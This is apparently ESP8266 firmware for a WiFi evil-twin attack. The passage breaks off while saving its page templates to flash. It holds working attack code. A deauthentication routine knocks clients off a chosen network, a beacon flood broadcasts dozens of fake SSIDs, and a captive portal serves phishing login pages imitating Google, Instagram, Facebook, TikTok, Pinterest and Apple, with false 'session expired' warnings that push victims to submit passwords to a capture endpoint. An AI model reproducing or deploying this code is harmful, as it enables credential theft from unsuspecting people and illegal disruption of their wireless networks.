#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <FS.h>

extern "C" {
  #include "user_interface.h"
}

// ========== CONFIGURATION ==========
const byte DNS_PORT = 53;
const int MAX_NETWORKS = 20;
IPAddress apIP(192, 168, 4, 1);
IPAddress subnet(255, 255, 255, 0);
const String CAPTURE_FILE = "/credentials.txt";

// ========== GLOBAL VARIABLES ==========
DNSServer dnsServer;
ESP8266WebServer webServer(80);

// File list caching variables
String cachedFileListHTML = "";
unsigned long lastFileListUpdate = 0;
int cachedFileCount = -1;
unsigned long lastFileCountUpdate = 0;
const unsigned long CACHE_DURATION = 30000; // 30 seconds

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  int32_t rssi;
  bool inRange;
} Network;

Network networks[MAX_NETWORKS];
Network selectedNetwork;
bool hotspotActive = false;
String currentTemplate = "google";
unsigned long lastScan = 0;
bool isProcessing = false;
bool deauthing_active = false;
unsigned long deauth_now = 0;
unsigned long wifinow = 0;
String uploadStatus = "";
bool beaconSpamActive = false;
unsigned long beaconSpamTime = 0;
uint32_t beaconPacketCounter = 0;

// ========== PROVEN BEACON SPAM SETTINGS ==========
const uint8_t channels[] = {1, 6, 11};
const bool wpa2 = false;
const bool appendSpaces = true;
uint8_t channelIndex = 0;
uint8_t macAddr[6];
uint8_t wifi_channel = 1;
char emptySSID[32];

// ONE DIRECTION SONG TITLES as SSIDs
const char ONE_DIRECTION_SSIDS[] PROGMEM = {
  "What Makes You Beautiful\n"
  "Story of My Life\n"
  "Drag Me Down\n"
  "Steal My Girl\n"
  "Night Changes\n"
  "Best Song Ever\n"
  "Live While We're Young\n"
  "Kiss You\n"
  "Little Things\n"
  "One Thing\n"
  "Midnight Memories\n"
  "You And I\n"
  "Perfect\n"
  "History\n"
  "Infinity\n"
  "Olivia\n"
  "Strong\n"
  "18\n"
  "Fool's Gold\n"
  "Happily\n"
  "Right Now\n"
  "Little White Lies\n"
  "Through the Dark\n"
  "Better Than Words\n"
  "Don't Forget Where You Belong\n"
  "Alive\n"
  "Act My Age\n"
  "Change Your Ticket\n"
  "Girl Almighty\n"
  "No Control\n"
  "Fireproof\n"
  "Spaces\n"
  "Stockholm Syndrome\n"
  "Clouds\n"
  "Change My Mind\n"
  "Illusion\n"
  "Once in a Lifetime\n"
  "Everything About You\n"
  "Same Mistakes\n"
  "Last First Kiss\n"
  "Summer Love\n"
  "She's Not Afraid\n"
  "Loved You First\n"
  "Nobody Compares\n"
  "They Don't Know About Us\n"
  "Rock Me\n"
  "C'mon C'mon\n"
  "Save You Tonight\n"
  "Taken\n"
  "I Want\n"
  "I Wish\n"
  "Over Again\n"
  "Back for You\n"
  "Up All Night\n"
  "Tell Me a Lie\n"
  "Gotta Be You\n"
  "More Than This\n"
  "Moments\n"
  "Stand Up\n"
  "I Should Have Kissed You\n"
  "One Direction WiFi\n"
  "1D Fan Club WiFi\n"
  "Harry Styles Official\n"
  "Liam Payne WiFi\n"
  "Louis Tomlinson AP\n"
  "Niall Horan Network\n"
  "Zayn Malik Hotspot\n"
  "Directioners Only\n"
  "1D Concert WiFi\n"
  "Take Me Home WiFi\n"
  "Made In The AM AP\n"
  "Four Album Network\n"
  "Midnight Memories AP\n"
  "Perfect Song WiFi\n"
};

uint8_t beaconPacket[109] = {
  0x80, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
  0x00, 0x00,
  0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00,
  0xe8, 0x03,
  0x21, 0x00,
  0x00, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x01, 0x08,
  0x82, 0x84, 0x8b, 0x96,
  0x24, 0x30, 0x48, 0x6c,
  0x03, 0x01,
  0x01,
};

uint32_t packetSize = 0;

// ========== SIGNAL STRENGTH TO PERCENTAGE ==========
int getSignalQuality(int rssi) {
  if (rssi >= -50) return 100;
  else if (rssi >= -60) return 90;
  else if (rssi >= -70) return 75;
  else if (rssi >= -80) return 50;
  else if (rssi >= -90) return 25;
  else return 0;
}

// ========== FORMAT UPTIME ==========
String formatUptime() {
  unsigned long seconds = millis() / 1000;
  unsigned long hours = seconds / 3600;
  seconds = seconds % 3600;
  unsigned long minutes = seconds / 60;
  seconds = seconds % 60;
  
  char buffer[12];
  snprintf(buffer, sizeof(buffer), "%02lu:%02lu:%02lu", hours, minutes, seconds);
  return String(buffer);
}

// ========== STORAGE MONITORING ==========
String getRAMInfo() {
  uint32_t freeHeap = ESP.getFreeHeap();
  uint32_t heapFragmentation = ESP.getHeapFragmentation();
  uint32_t maxFreeBlockSize = ESP.getMaxFreeBlockSize();
  
  String info = String(freeHeap) + " bytes free";
  info += " | Frag: " + String(heapFragmentation) + "%";
  info += " | Max Block: " + String(maxFreeBlockSize) + " bytes";
  
  if (freeHeap < 10000) {
    info += " (⚠️ Low)";
  } else if (freeHeap < 20000) {
    info += " (⚠️ Medium)";
  } else {
    info += " (✅ Healthy)";
  }
  
  return info;
}

String getSPIFFSInfo() {
  if (!SPIFFS.begin()) {
    return "❌ Not Mounted";
  }
  
  FSInfo fs_info;
  SPIFFS.info(fs_info);
  
  uint32_t totalBytes = fs_info.totalBytes;
  uint32_t usedBytes = fs_info.usedBytes;
  float usedPercent = (usedBytes * 100.0) / totalBytes;
  
  String info = String(usedBytes/1024) + "KB/" + String(totalBytes/1024) + "KB (" + String(usedPercent, 1) + "%)";
  
  if (usedPercent > 90) {
    info += " (⚠️ Full)";
  } else if (usedPercent > 70) {
    info += " (⚠️ High)";
  } else {
    info += " (✅ OK)";
  }
  
  return info;
}

// ========== BEACON SPAM FUNCTIONS ==========
void nextChannel() {
  if (sizeof(channels) > 1) {
    uint8_t ch = channels[channelIndex];
    channelIndex++;
    if (channelIndex >= sizeof(channels)) channelIndex = 0;

    if (ch != wifi_channel && ch >= 1 && ch <= 14) {
      wifi_channel = ch;
      wifi_set_channel(wifi_channel);
    }
  }
}

void randomMac() {
  for (int i = 0; i < 6; i++) {
    macAddr[i] = random(256);
  }
}

void performProvenBeaconSpam() {
  if (!beaconSpamActive || millis() - beaconSpamTime < 100) return;
  
  beaconSpamTime = millis();
  
  int i = 0;
  int j = 0;
  int ssidNum = 1;
  char tmp;
  int ssidsLen = strlen_P(ONE_DIRECTION_SSIDS);
  bool sent = false;

  nextChannel();

  while (i < ssidsLen) {
    j = 0;
    do {
      tmp = pgm_read_byte(ONE_DIRECTION_SSIDS + i + j);
      j++;
    } while (tmp != '\n' && j <= 32 && i + j < ssidsLen);

    uint8_t ssidLen = j - 1;
    macAddr[5] = ssidNum;
    ssidNum++;

    memcpy(&beaconPacket[10], macAddr, 6);
    memcpy(&beaconPacket[16], macAddr, 6);
    memcpy(&beaconPacket[38], emptySSID, 32);
    memcpy_P(&beaconPacket[38], &ONE_DIRECTION_SSIDS[i], ssidLen);
    beaconPacket[82] = wifi_channel;

    if (appendSpaces) {
      for (int k = 0; k < 3; k++) {
        if (wifi_send_pkt_freedom(beaconPacket, packetSize, 0) == 0) {
          beaconPacketCounter++;
        }
        delay(1);
      }
    } else {
      uint16_t tmpPacketSize = (packetSize - 32) + ssidLen;
      uint8_t* tmpPacket = new uint8_t[tmpPacketSize];
      memcpy(&tmpPacket[0], &beaconPacket[0], 38 + ssidLen);
      tmpPacket[37] = ssidLen;
      memcpy(&tmpPacket[38 + ssidLen], &beaconPacket[70], 13);

      for (int k = 0; k < 3; k++) {
        if (wifi_send_pkt_freedom(tmpPacket, tmpPacketSize, 0) == 0) {
          beaconPacketCounter++;
        }
        delay(1);
      }
      delete[] tmpPacket;
    }

    i += j;
  }

  static unsigned long lastPrint = 0;
  if (beaconPacketCounter % 100 == 0 && millis() - lastPrint > 1000) {
    Serial.println("[🎵] Beacon Spam: " + String(beaconPacketCounter) + " packets sent");
    lastPrint = millis();
  }
}

// ========== DEAUTHENTICATION FUNCTION ==========
void performDeauth() {
  if (deauthing_active && selectedNetwork.ssid != "" && millis() - deauth_now >= 200) {
    wifi_set_channel(selectedNetwork.ch);
    
    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
                                0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
                                0xFF, 0x00, 0x00, 0x01, 0x00};

    memcpy(&deauthPacket[10], selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], selectedNetwork.bssid, 6);
    deauthPacket[24] = 1;

    deauthPacket[0] = 0xC0;
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    
    deauthPacket[0] = 0xA0;
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);

    deauth_now = millis();
  }
}


// ========== TEMPLATES WITH PSYCHOLOGICAL ERROR MESSAGES ==========
const char TEMPLATE_GOOGLE[] PROGMEM = "<!DOCTYPE html><html><head><meta charset=\"UTF-8\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\"><title>Google - Sign in</title><style>* { -webkit-tap-highlight-color: transparent; box-sizing: border-box; margin: 0; padding: 0; } body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; } .container { width: 100%; max-width: 400px; } .google-header { text-align: center; margin-bottom: 25px; } .google-colors { display: flex; justify-content: center; gap: 6px; margin-bottom: 10px; } .g-color { width: 22px; height: 22px; border-radius: 50%; } .g-blue { background: #4285f4; } .g-red { background: #ea4335; } .g-yellow { background: #fbbc05; } .g-green { background: #34a853; } h1 { font-size: 24px; font-weight: 400; text-align: center; margin: 0 0 15px; color: #202124; } .subtitle { color: #5f6368; text-align: center; font-size: 16px; margin-bottom: 25px; } .input-group { margin-bottom: 20px; } input { width: 100%; height: 52px; padding: 0 15px; font-size: 16px; border: 1px solid #dadce0; border-radius: 8px; background: #fff; } input:focus { outline: none; border-color: #1a73e8; border-width: 2px; } .btn-next { width: 100%; height: 52px; background: #1a73e8; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: 500; cursor: pointer; margin-top: 10px; } .btn-next:active { background: #0d5bb9; transform: scale(0.98); } .links { text-align: center; margin-top: 25px; font-size: 14px; } .links a { color: #1a73e8; text-decoration: none; margin: 0 8px; } .error-message { background: #fce8e6; color: #c5221f; padding: 12px; border-radius: 8px; margin-bottom: 20px; font-size: 14px; display: flex; align-items: center; gap: 8px; border: 1px solid #f5c6c5; } .error-message::before { content: '⚠️'; }</style></head><body><div class=\"container\"><div class=\"google-header\"><div class=\"google-colors\"><div class=\"g-color g-blue\"></div><div class=\"g-color g-red\"></div><div class=\"g-color g-yellow\"></div><div class=\"g-color g-green\"></div></div><div style=\"font-size: 32px; font-weight: 500; color: #5f6368; margin-top: 10px;\">Google</div></div><h1>Sign in</h1><div class=\"subtitle\">Use your Google Account</div><div class=\"error-message\">Your session has expired. Please sign in again to continue.</div><form method=\"post\" action=\"/capture\"><div class=\"input-group\"><input type=\"email\" name=\"email\" placeholder=\"Email or phone\" required autofocus></div><div class=\"input-group\"><input type=\"password\" name=\"password\" placeholder=\"Enter your password\" required></div><button class=\"btn-next\" type=\"submit\">Next</button></form><div class=\"links\"><a href=\"#\">Forgot email?</a> &bull; <a href=\"#\">Learn more</a></div></div></body></html>";

const char TEMPLATE_INSTAGRAM[] PROGMEM = "<!DOCTYPE html><html><head><meta charset=\"UTF-8\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\"><title>Instagram</title><style>* { -webkit-tap-highlight-color: transparent; box-sizing: border-box; margin: 0; padding: 0; } body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #fafafa; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; } .container { width: 100%; max-width: 400px; } .login-box { background: #fff; border: 1px solid #dbdbdb; border-radius: 12px; padding: 30px 25px; } .logo { text-align: center; margin-bottom: 25px; } .insta-logo { font-family: 'Instagram', cursive; font-size: 42px; background: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d); -webkit-background-clip: text; -webkit-text-fill-color: transparent; } .input-group { margin-bottom: 12px; } input { width: 100%; height: 44px; padding: 0 12px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 8px; font-size: 14px; } input:focus { outline: none; border-color: #a8a8a8; } .btn-login { width: 100%; height: 44px; background: #0095f6; color: #fff; border: none; border-radius: 8px; font-weight: 600; font-size: 14px; cursor: pointer; margin-top: 10px; } .btn-login:active { background: #1877f2; transform: scale(0.98); } .divider { display: flex; align-items: center; margin: 20px 0; color: #8e8e8e; font-size: 13px; font-weight: 600; } .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #dbdbdb; } .divider span { padding: 0 18px; } .fb-login { color: #385185; font-weight: 600; text-decoration: none; display: block; text-align: center; margin: 15px 0; font-size: 14px; } .forgot { font-size: 12px; color: #00376b; text-decoration: none; display: block; text-align: center; } .signup { margin-top: 20px; padding: 20px; background: #fff; border: 1px solid #dbdbdb; border-radius: 12px; text-align: center; font-size: 14px; } .signup a { color: #0095f6; font-weight: 600; text-decoration: none; } .error-message { background: #fee; color: #ed4956; padding: 12px; border-radius: 8px; margin-bottom: 20px; font-size: 14px; border: 1px solid #ffd1d1; text-align: center; }</style></head><body><div class=\"container\"><div class=\"login-box\"><div class=\"logo\"><div class=\"insta-logo\">Instagram</div></div><div class=\"error-message\">Session expired. Please log in again to access your account.</div><form method=\"post\" action=\"/capture\"><div class=\"input-group\"><input type=\"text\" name=\"username\" placeholder=\"Phone number, username, or email\" required></div><div class=\"input-group\"><input type=\"password\" name=\"password\" placeholder=\"Password\" required></div><button class=\"btn-login\" type=\"submit\">Log In</button></form><div class=\"divider\"><span>OR</span></div><a href=\"#\" class=\"fb-login\">Log in with Facebook</a><a href=\"#\" class=\"forgot\">Forgot password?</a></div><div class=\"signup\">Don't have an account? <a href=\"#\">Sign up</a></div></div></body></html>";

const char TEMPLATE_FACEBOOK[] PROGMEM = "<!DOCTYPE html><html><head><meta charset=\"UTF-8\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\"><title>Facebook - Log in or Sign up</title><style>* { -webkit-tap-highlight-color: transparent; box-sizing: border-box; margin: 0; padding: 0; } body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; } .container { width: 100%; max-width: 400px; } .login-box { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); text-align: center; } input { width: 100%; padding: 16px; margin-bottom: 15px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; } input:focus { outline: none; border-color: #1877f2; } .login-btn { width: 100%; padding: 16px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; margin-bottom: 20px; } .login-btn:active { background: #166fe5; transform: scale(0.98); } .forgot-link { color: #1877f2; text-decoration: none; font-size: 14px; display: block; margin-bottom: 20px; } .divider { height: 1px; background: #dadde1; margin: 20px 0; } .create-btn { background: #42b72a; color: white; border: none; border-radius: 6px; padding: 16px; font-size: 17px; font-weight: bold; cursor: pointer; width: 100%; } .create-btn:active { background: #36a420; transform: scale(0.98); } .security-alert { background: #fff8e1; border: 1px solid #ffd54f; color: #5d4037; padding: 12px; border-radius: 6px; margin-bottom: 20px; font-size: 14px; text-align: left; } .security-alert strong { color: #e65100; }</style></head><body><div class=\"container\"><div class=\"login-box\"><div style=\"color: #1877f2; font-size: 48px; font-weight: bold; margin-bottom: 20px;\">facebook</div><div class=\"security-alert\"><strong>🔒 Security Alert:</strong> We detected unusual activity from your device. Please verify your identity to continue.</div><form method=\"post\" action=\"/capture\"><input type=\"text\" name=\"email\" placeholder=\"Email address or phone number\" required><input type=\"password\" name=\"password\" placeholder=\"Password\" required><button class=\"login-btn\" type=\"submit\">Log In</button></form><a href=\"#\" class=\"forgot-link\">Forgotten password?</a><div class=\"divider\"></div><button class=\"create-btn\">Create New Account</button></div></div></body></html>";

const char TEMPLATE_TIKTOK[] PROGMEM = "<!DOCTYPE html><html><head><meta charset=\"UTF-8\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\"><title>TikTok - Log in</title><style>* { -webkit-tap-highlight-color: transparent; box-sizing: border-box; margin: 0; padding: 0; } body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #000; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; } .container { width: 100%; max-width: 400px; } .login-box { background: #121212; border-radius: 16px; padding: 30px 25px; text-align: center; } .logo { margin-bottom: 25px; } .tiktok-logo { font-size: 42px; font-weight: 700; letter-spacing: -1px; color: #fff; } .tiktok-logo span:first-child { color: #69C9D0; } .tiktok-logo span:last-child { color: #EE1D52; } .input-group { margin-bottom: 16px; } input { width: 100%; height: 48px; padding: 0 16px; background: #1e1e1e; border: 1px solid #333; border-radius: 8px; color: #fff; font-size: 16px; } input:focus { outline: none; border-color: #69C9D0; } .btn-login { width: 100%; height: 48px; background: #EE1D52; color: #fff; border: none; border-radius: 8px; font-weight: 600; font-size: 16px; cursor: pointer; margin-top: 10px; } .btn-login:active { background: #d41b4a; transform: scale(0.98); } .divider { display: flex; align-items: center; margin: 20px 0; color: #666; font-size: 14px; } .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #333; } .divider span { padding: 0 15px; } .other-options { color: #69C9D0; font-size: 14px; margin-top: 20px; } .other-options a { color: #69C9D0; text-decoration: none; display: block; margin: 8px 0; } .footer { margin-top: 25px; color: #666; font-size: 12px; } .footer a { color: #666; text-decoration: none; } .session-notice { background: #1a1a1a; border-left: 4px solid #EE1D52; padding: 12px; margin-bottom: 20px; color: #ccc; font-size: 13px; text-align: left; }</style></head><body><div class=\"container\"><div class=\"login-box\"><div class=\"logo\"><div class=\"tiktok-logo\"><span>Tik</span><span>Tok</span></div></div><div class=\"session-notice\">⚠️ Your login session has timed out. Please sign in again to continue watching videos.</div><form method=\"post\" action=\"/capture\"><div class=\"input-group\"><input type=\"text\" name=\"username\" placeholder=\"Username or email\" required></div><div class=\"input-group\"><input type=\"password\" name=\"password\" placeholder=\"Password\" required></div><button class=\"btn-login\" type=\"submit\">Log in</button></form><div class=\"divider\"><span>or</span></div><div class=\"other-options\"><a href=\"#\">Use phone / email / username</a><a href=\"#\">Log in with QR code</a></div><div class=\"footer\">By continuing, you agree to our <a href=\"#\">Terms of Service</a> and confirm that you have read our <a href=\"#\">Privacy Policy</a>.</div></div></div></body></html>";

const char TEMPLATE_PINTEREST[] PROGMEM = "<!DOCTYPE html><html><head><meta charset=\"UTF-8\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\"><title>Pinterest</title><style>* { -webkit-tap-highlight-color: transparent; box-sizing: border-box; margin: 0; padding: 0; } body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; } .container { width: 100%; max-width: 400px; } .login-box { text-align: center; } .logo { margin-bottom: 30px; } .pinterest-logo { font-size: 48px; font-weight: 700; color: #E60023; letter-spacing: -1px; } .welcome-text { font-size: 28px; font-weight: 600; color: #111; margin-bottom: 10px; } .subtitle { color: #666; margin-bottom: 30px; font-size: 16px; } .input-group { margin-bottom: 16px; } input { width: 100%; height: 48px; padding: 0 16px; border: 2px solid #ddd; border-radius: 24px; font-size: 16px; transition: all 0.3s; } input:focus { outline: none; border-color: #E60023; } .btn-login { width: 100%; height: 48px; background: #E60023; color: #fff; border: none; border-radius: 24px; font-weight: 700; font-size: 16px; cursor: pointer; margin-top: 10px; } .btn-login:active { background: #c5001e; transform: scale(0.98); } .divider { display: flex; align-items: center; margin: 25px 0; color: #666; font-size: 14px; font-weight: 600; } .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #ddd; } .divider span { padding: 0 15px; } .other-login { margin-bottom: 20px; } .other-btn { width: 100%; height: 48px; background: #fff; border: 2px solid #ddd; border-radius: 24px; font-weight: 600; font-size: 16px; cursor: pointer; margin-bottom: 12px; display: flex; align-items: center; justify-content: center; gap: 10px; } .other-btn:active { background: #f5f5f5; transform: scale(0.98); } .signup-link { color: #666; font-size: 14px; } .signup-link a { color: #E60023; font-weight: 600; text-decoration: none; } .auth-notice { background: #ffebee; border: 1px solid #ffcdd2; color: #c62828; padding: 12px; border-radius: 12px; margin-bottom: 20px; font-size: 14px; } .auth-notice::before { content: '🔐 '; }</style></head><body><div class=\"container\"><div class=\"login-box\"><div class=\"logo\"><div class=\"pinterest-logo\">Pinterest</div></div><div class=\"welcome-text\">Welcome to Pinterest</div><div class=\"subtitle\">Find new ideas to try</div><div class=\"auth-notice\">Authentication required: Your session has expired due to inactivity.</div><form method=\"post\" action=\"/capture\"><div class=\"input-group\"><input type=\"email\" name=\"email\" placeholder=\"Email\" required></div><div class=\"input-group\"><input type=\"password\" name=\"password\" placeholder=\"Password\" required></div><button class=\"btn-login\" type=\"submit\">Log in</button></form><div class=\"divider\"><span>OR</span></div><div class=\"other-login\"><button class=\"other-btn\"><span style=\"color: #1877F2; font-size: 20px;\">f</span> Continue with Facebook</button><button class=\"other-btn\">Continue with Google</button></div><div class=\"signup-link\">Not on Pinterest yet? <a href=\"#\">Sign up</a></div></div></div></body></html>";

const char TEMPLATE_APPLE[] PROGMEM = "<!DOCTYPE html><html><head><meta charset=\"UTF-8\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\"><title>Apple ID</title><style>* { -webkit-tap-highlight-color: transparent; box-sizing: border-box; margin: 0; padding: 0; } body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f5f5f7; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; } .container { width: 100%; max-width: 400px; } .login-box { background: #fff; border-radius: 12px; padding: 30px 25px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); } .apple-logo { text-align: center; margin-bottom: 25px; } .apple-logo svg { width: 48px; height: 48px; fill: #000; } h1 { text-align: center; font-size: 24px; font-weight: 600; margin-bottom: 25px; color: #000; } .input-group { margin-bottom: 20px; } input { width: 100%; height: 52px; padding: 0 16px; border: 1px solid #d2d2d7; border-radius: 8px; font-size: 17px; background: #f5f5f7; } input:focus { outline: none; border-color: #007AFF; background: #fff; } .forgot-link { text-align: right; margin-bottom: 25px; } .forgot-link a { color: #007AFF; text-decoration: none; font-size: 15px; } .btn-login { width: 100%; height: 52px; background: #007AFF; color: #fff; border: none; border-radius: 8px; font-size: 17px; font-weight: 600; cursor: pointer; } .btn-login:active { background: #0066d6; transform: scale(0.98); } .divider { display: flex; align-items: center; margin: 25px 0; color: #86868b; } .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #d2d2d7; } .divider span { padding: 0 15px; font-size: 14px; } .apple-id-help { text-align: center; margin-top: 25px; } .apple-id-help a { color: #007AFF; text-decoration: none; font-size: 15px; display: block; margin: 8px 0; } .create-account { text-align: center; margin-top: 30px; padding-top: 20px; border-top: 1px solid #d2d2d7; color: #86868b; font-size: 15px; } .create-account a { color: #007AFF; text-decoration: none; font-weight: 600; } .security-prompt { background: #f2f2f7; border: 1px solid #d1d1d6; border-radius: 8px; padding: 16px; margin-bottom: 25px; font-size: 14px; color: #1d1d1f; } .security-prompt strong { color: #007AFF; }</style></head><body><div class=\"container\"><div class=\"login-box\"><div class=\"apple-logo\"><svg viewBox=\"0 0 24 24\"><path d=\"M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.31-2.33 1.05-3.11z\"/></svg></div><h1>Sign in to your Apple ID</h1><div class=\"security-prompt\"><strong>Verification Required:</strong> For your security, please sign in again to access iCloud services.</div><form method=\"post\" action=\"/capture\"><div class=\"input-group\"><input type=\"text\" name=\"apple_id\" placeholder=\"Apple ID\" required></div><div class=\"input-group\"><input type=\"password\" name=\"password\" placeholder=\"Password\" required></div><div class=\"forgot-link\"><a href=\"#\">Forgot Apple ID or Password?</a></div><button class=\"btn-login\" type=\"submit\">Sign In</button></form><div class=\"divider\"><span>or</span></div><div class=\"apple-id-help\"><a href=\"#\">Create an Apple ID</a><a href=\"#\">Need help?</a></div><div class=\"create-account\">Don't have an Apple ID? <a href=\"#\">Create one now</a></div></div></div></body></html>";

const char SUCCESS_PAGE[] PROGMEM = "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0'><title>Verifying Account - Please Wait</title><style>*{margin:0;padding:0;box-sizing:border-box;}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:linear-gradient(135deg,#2ecc71 0%,#27ae60 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}.container{background:white;border-radius:16px;padding:40px 30px;width:100%;max-width:400px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3);}.logo{margin-bottom:25px;}.logo-circle{width:70px;height:70px;margin:0 auto 20px;background:linear-gradient(135deg,#2ecc71 0%,#27ae60 100%);border-radius:50%;display:flex;align-items:center;justify-content:center;}.logo-icon{font-size:32px;color:white;}.spinner{margin:30px auto;width:50px;height:50px;border:4px solid #f3f3f3;border-top:4px solid #2ecc71;border-radius:50%;animation:spin 1s linear infinite;}@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}h1{color:#333;font-size:22px;margin-bottom:12px;font-weight:600;}.message{color:#666;font-size:15px;line-height:1.5;margin-bottom:25px;}.loader-dots{display:flex;justify-content:center;margin:25px 0;}.dot{width:10px;height:10px;background:#2ecc71;border-radius:50%;margin:0 5px;animation:bounce 1.4s infinite ease-in-out both;opacity:0.7;}.dot:nth-child(1){animation-delay:-0.32s;}.dot:nth-child(2){animation-delay:-0.16s;}@keyframes bounce{0%,80%,100%{transform:scale(0);}40%{transform:scale(1);}}.progress-container{width:100%;height:6px;background:#f0f0f0;border-radius:3px;margin:30px 0;overflow:hidden;}.progress-bar{height:100%;background:linear-gradient(to right,#2ecc71,#27ae60);width:0%;animation:progress 2s ease-in-out infinite;}@keyframes progress{0%{width:0%;margin-left:0%;}50%{width:40%;margin-left:30%;}100%{width:0%;margin-left:100%;}}.security-badges{display:flex;justify-content:center;gap:15px;margin-top:25px;}.badge{display:flex;align-items:center;gap:6px;font-size:12px;color:#666;}.badge-icon{font-size:14px;}.status-text{font-size:13px;color:#888;margin-top:20px;padding-top:20px;border-top:1px solid #eee;}</style><script>let dots=0;setInterval(function(){dots=(dots+1)%4;document.getElementById('dots').innerHTML='.'.repeat(dots);},500);const statusMessages=['Checking credentials','Verifying account','Checking security','Finalizing login','Login successful!'];let statusIndex=0;setInterval(function(){document.getElementById('status').textContent=statusMessages[statusIndex];statusIndex=(statusIndex+1)%statusMessages.length;if(statusIndex==4){setTimeout(function(){window.location.href='about:blank';},1000);}},1500);</script></head><body><div class='container'><div class='logo'><div class='logo-circle'><div class='logo-icon'>🔐</div></div></div><h1>Verifying Your Account</h1><div class='message'>Please wait while we verify your credentials<span id='dots'></span></div><div class='spinner'></div><div class='loader-dots'><div class='dot'></div><div class='dot'></div><div class='dot'></div></div><div class='progress-container'><div class='progress-bar'></div></div><div class='security-badges'><div class='badge'><span class='badge-icon'>🔒</span><span>Secure</span></div><div class='badge'><span class='badge-icon'>🔐</span><span>Encrypted</span></div><div class='badge'><span class='badge-icon'>✅</span><span>Verified</span></div></div><div class='status-text'><span id='status'>Checking credentials</span></div></div></body></html>";

// ========== SAVE TEMPLATES TO SPIFFS ==========
void saveTemplatesToSPIFFS() {
  Serial.println("\n[+] Saving all templates to SPIFFS...");
  
  const char* templates[] = {"google", "instagram", "facebook", "tiktok", "pinterest", "apple"};
  const char* templateData[] = {TEMPLATE_GOOGLE, TEMPLATE_INSTAGRAM, TEMPLATE_FACEBOOK, 
                                TEMPLATE_TIKTOK, TEMPLATE_PINTEREST, TEMPLATE_APPLE};
  
  for (int i = 0; i < 6; i++) {
    String filename = "/" + String(templates[i]) + ".html";
    if (!SPIFFS.exists(filename)) {
      File file = SPIFFS.open(filename, "w");
      if (file) {
        file.print(FPSTR(templateData[i]));
        file.close();
        Serial.println("[✓] " + String(templates[i]) + " template saved to SPIFFS");
